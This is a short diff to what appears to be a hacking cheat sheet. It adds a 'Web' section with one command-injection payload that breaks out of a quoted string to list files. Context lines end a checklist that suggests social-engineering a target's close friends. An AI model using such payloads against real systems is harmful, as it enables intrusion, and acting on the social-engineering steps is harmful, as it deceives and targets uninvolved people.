@@ -256,3 +256,7 @@ e dbg.profile=profile.rr2
 6. If appliable, check for close contacts and repeat 1-5.
 7. If 6 didn't have much result try to social engineer target's close friends.
 ```
+### Web
+```
+"; echo $(ls) #
+```
